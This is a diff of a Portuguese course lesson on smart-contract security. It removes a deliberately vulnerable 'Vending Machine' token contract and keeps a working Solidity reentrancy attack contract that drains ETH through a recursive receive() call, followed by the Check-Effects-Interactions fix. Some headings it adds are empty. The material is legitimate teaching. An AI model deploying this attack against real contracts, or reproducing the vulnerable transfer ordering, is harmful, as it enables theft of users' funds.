@@ -1,12 +1,8 @@
-Aqui está a versão expandida para a Aula 6.3 sobre a implementação de uma **Vendor Machine** com um bug de reentrância, incluindo explicações sobre segurança em smartcontracts:
-
----
-
 # Aula 6.3: Implementação e Segurança de Smartcontracts
 
 ## Introdução
 
-Bem-vindos à nossa aula sobre a implementação de smartcontracts com foco em **segurança**, onde vamos construir uma **Vendor Machine** que contém uma vulnerabilidade de **reentrância**. Essa vulnerabilidade será explorada através de um ataque, e posteriormente vamos aprender como corrigir esse problema.
+Bem-vindos à nossa aula sobre a implementação de smartcontracts com foco em **segurança**, onde vamos construir uma **Vending Machine** que contém uma vulnerabilidade de **reentrância**. Essa vulnerabilidade será explorada através de um ataque, e posteriormente vamos aprender como corrigir esse problema.
 
 A segurança é um dos aspectos mais críticos no desenvolvimento de contratos inteligentes, pois bugs e vulnerabilidades podem levar à perda de fundos ou ao comportamento inesperado dos contratos. Neste contexto, a reentrância é uma das falhas mais exploradas e será o foco desta aula.
 
@@ -27,144 +23,26 @@ O bug de reentrância foi o causador do famoso hack do **DAO** em 2016, que resu
 
 ---
 
-## Implementando uma Vendor Machine
+## Correção do bug de Access Control
 
-A **Vendor Machine** é um contrato que permite aos usuários comprar e vender tokens ERC-20, simulando uma máquina de vendas automática. O contrato contém funções para:
+## Implementando uma Vending Machine
+
+A **Vending Machine** é um contrato que permite aos usuários comprar e vender tokens ERC-20, simulando uma máquina de vendas automática. O contrato contém funções para:
 
 - Comprar tokens com ETH.
 - Vender tokens de volta por ETH.
 
-Contudo, a função `sellTokens` contém uma **vulnerabilidade de reentrância** que exploraremos mais tarde. Aqui está o contrato:
+## Explicação do Bug de Reentrância
 
-### VENDOR MACHINE
-
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
-
-import {Token} from "./Token.sol";
-import {UD60x18, ud} from "@prb/math/UD60x18.sol";
-
-contract VendorMachine {
-    event TokensPurchased(address buyer, uint256 amountOfETH, uint256 amountOfTokens);
-    event Withdraw(address owner, uint256 balance);
-    event TokensSold(address seller, uint256 amountOfTokens, uint256 amountOfETH);
-
-    uint256 public constant FACTOR = 943;
-    UD60x18 private _price;
-    address public owner;
-    Token token;
-
-    error VendorMachineNotHaveTokens();
-    error VendorMachineNotHaveETH();
-    error YouNotHaveEnoughTokens();
-    error YouSendWrongValueETH();
-    error OneTokenAtATime();
-    error WithdrawFailed();
-    error Unauthorized();
-
-    modifier onlyOwner() {
-        if (msg.sender != owner) {
-            revert Unauthorized();
-        }
-        _;
-    }
-
-    constructor(uint256 _initialPrice, address _token) payable {
-        _price = ud(_initialPrice);
-        token = Token(_token);
-        owner = msg.sender;
-    }
-
-    function price() public view returns (uint256) {
-        return _price.unwrap();
-    }
-
-    function buyTokens() external payable returns (bool) {
-        UD60x18 msgValue = ud(msg.value);
-        UD60x18 tokensToBuy = msgValue.div(_price);
-        if (tokensToBuy.unwrap() <= 0) {
-            revert YouSendWrongValueETH();
-        }
-        if (getTokensAvailable() < tokensToBuy.unwrap()) {
-            revert VendorMachineNotHaveTokens();
-        }
-
-        UD60x18 tokensToTransfer = tokensToBuy.mul(ud(1e18));
-        token.transfer(msg.sender, tokensToTransfer.unwrap());
-
-        emit TokensPurchased(msg.sender, msg.value, tokensToTransfer.unwrap());
-
-        _price = _price.add(ud(1 ether));
-
-        return true;
-    }
-
-    function sellTokens() external {
-        if (token.balanceOf(msg.sender) < 1) {
-            revert YouNotHaveEnoughTokens();
-        } else if (address(this).balance < _price.unwrap()) {
-            revert VendorMachineNotHaveETH();
-        } else {
-            // Vulnerabilidade de reentrância aqui
-            (bool ok, bytes memory data_error) = msg.sender.call{value: _price.unwrap()}("");
-            if (!ok) {
-                assembly {
-                    revert(add(data_error, 32), mload(data_error))
-                }
-            }
-
-            try token.transferFrom(msg.sender, address(this), 1e18) {
-                emit TokensSold(msg.sender, 1e18, _price.unwrap());
-
-                // Ajuste de preço após a venda
-                _price = calculateNewPrice();
-            } catch (bytes memory transfer_error) {
-                assembly {
-                    revert(add(transfer_error, 32), mload(transfer_error))
-                }
-            }
-        }
-    }
-
-    function withdraw() external onlyOwner {
-        uint256 balance = address(this).balance;
-
-        if (balance == 0) {
-            revert VendorMachineNotHaveETH();
-        }
-
-        (bool ok, bytes memory data) = msg.sender.call{value: balance}("");
-        if (!ok) {
-            assembly {
-                revert(add(data, 32), mload(data))
-            }
-        }
-
-        emit Withdraw(msg.sender, balance);
-    }
-
-    function getTokensAvailable() public view returns (uint256) {
-        return token.balanceOf(address(this));
-    }
-
-    function calculateNewPrice() internal view returns (UD60x18) {
-        return _price.mul(ud(FACTOR)).div(ud(1000));
-    }
-}
-```
-
-### Explicação do Bug de Reentrância
-
-A vulnerabilidade de reentrância ocorre na função `sellTokens`. Ao chamar `msg.sender.call{value: _price.unwrap()}()`, o contrato transfere ETH para o usuário antes de atualizar o estado do contrato (ou seja, antes de completar a transferência dos tokens). Isso permite que um atacante chame novamente a função `sellTokens` dentro do `receive` do contrato atacante, driblando a lógica e vendendo mais tokens do que deveria.
+1. O problema está na função `sellTokens`.
+2. Quando um contrato recebe Ether, a função `receive` é chamada automaticamente.
+3. Se a função `receive` do contrato atacante chamar de volta a função `sellTokens` antes que o contrato "vítima" finalize sua execução, ele pode entrar de novo no contrato de forma recursiva.
+4. O problema é que o contrato "vítima" só atualiza o estado (como o saldo do usuário) no final da execução da função.
+5. Isso permite que a reentrância aconteça repetidamente usando o estado anterior, já que o estado só é alterado após todas as chamadas recursivas. Isso permite drenar os fundos do contrato.
 
 ---
 
 ## Escrevendo um ataque para a função `sellTokens`
-
-Agora que identificamos a vulnerabilidade, podemos criar um contrato malicioso que a explore. Este contrato repetirá a chamada para a função `sellTokens` na **Vendor Machine** para esvaziar seu saldo de ETH.
-
-### Contrato de Ataque
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -174,42 +52,37 @@ import {VendorMachine} from "./VendorMachine.sol";
 import {Token} from "./Token.sol";
 
 contract ReentrancyAttack {
-    VendorMachine public vendorMachine;
+    VendorMachine public vendingMachine;
     Token public token;
 
-    constructor(address _vendorMachine, address _token) {
-        vendorMachine = VendorMachine(_vendorMachine);
+    constructor(address _vendingMachine, address _token) {
+        vendingMachine = VendorMachine(_vendingMachine);
         token = Token(_token);
     }
 
     function run() external payable {
-        vendorMachine.buyTokens{value: 10 ether}();  // Compra tokens inicialmente
+        vendingMachine.buyTokens{value: 10 ether}();
+        token.approve(address(vendingMachine), type(uint256).max);
 
-        token.approve(address(vendorMachine), type(uint256).max);  // Aprova venda de tokens
-
-        vendorMachine.sellTokens();  // Começa o ataque de reentrância
+        vendingMachine.sellTokens();
     }
 
     receive() external payable {
         // Executa o ataque de reentrância, chamando `sellTokens` repetidamente enquanto houver saldo
-        if (address(vendorMachine).balance >= vendorMachine.price() && token.balanceOf(address(this)) > 0) {
-            vendorMachine.sellTokens();
+        if (address(vendingMachine).balance >= vendingMachine.price() && token.balanceOf(address(this)) > 0) {
+            vendingMachine.sellTokens();
         }
     }
 }
 ```
 
-### Explicação do Ataque
-
-O contrato **ReentrancyAttack** compra tokens da **Vendor Machine** e, ao vender os tokens, entra em um loop de reentrância através da função `receive()`, chamando repetidamente `sellTokens` antes que o estado do contrato original seja atualizado.
+## Criando teste para executar o Ataque
 
 ---
 
 ## Corrigindo a Vulnerabilidade
 
 A correção para esse tipo de ataque é simples, mas extremamente importante. Precisamos garantir que o estado do contrato seja atualizado **antes** de realizar qualquer transferência de ETH para o usuário. Isso pode ser feito reorganizando a função `sellTokens` para seguir o padrão **"verifique-efeitos-interaja"** (Check-Effects-Interactions).
-
-### Correção
 
 ```solidity
 function sellTokens() external {
@@ -233,9 +106,7 @@ function sellTokens() external {
 
     // Só depois de atualizar o estado, transferimos o ETH
     (bool ok, bytes memory data_error) = msg.sender.call{value: _price.unwrap()}("");
-    if
-
- (!ok) {
+    if (!ok) {
         assembly {
             revert(add(data_error, 32), mload(data_error))
         }
@@ -257,7 +128,7 @@ Com esta última aula, cobrimos os aspectos críticos do **desenvolvimento segur
 
 Nesta aula, abordamos:
 
-- A **implementação de uma Vendor Machine** para compra e venda de tokens ERC-20.
+- A **implementação de uma Vending Machine** para compra e venda de tokens ERC-20.
 - A introdução à **segurança em contratos inteligentes**, com foco no ataque de reentrância.
 - A escrita de um **contrato de ataque** para explorar a vulnerabilidade de reentrância.
 - A **correção da vulnerabilidade** aplicando o padrão "verifique-efeitos-interaja".
@@ -266,7 +137,7 @@ Nesta aula, abordamos:
 
 ## Lição de Casa
 
-1. Implementar a **Vendor Machine** em um ambiente local.
+1. Implementar a **Vending Machine** em um ambiente local.
 2. Reproduzir o **ataque de reentrância** para ver como ele funciona na prática.
 3. Corrigir a vulnerabilidade de reentrância no contrato e testar novamente.
 4. Explorar outras vulnerabilidades comuns, como **overflow** e **underflow**, e pesquisar como preveni-las.
